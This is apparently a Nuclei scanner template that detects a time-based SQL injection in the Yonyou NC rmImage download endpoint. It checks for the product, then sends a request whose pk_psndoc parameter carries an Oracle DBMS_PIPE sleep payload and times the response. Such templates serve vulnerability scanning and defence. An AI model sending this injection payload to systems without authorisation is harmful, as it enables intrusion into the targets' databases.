id: poc-yaml-yongyou-nc-rmimage-sqli
info:
  name: Yonyou NC rmImage SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    vendor: Yonyou NC

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

flow: http(1) && http(2)

http:
  - id: check-yonyou
    name: Check Yonyou NC presence
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Yonyou NC"

  - id: test-sqli
    name: Test for SQL Injection in rmImage
    method: GET
    path:
      - "{{BaseURL}}/portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{t1}})--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "image/png"
      - type: dsl
        dsl:
          - "response_time >= to_number(t1)"
          - "response_time <= to_number(t2)"
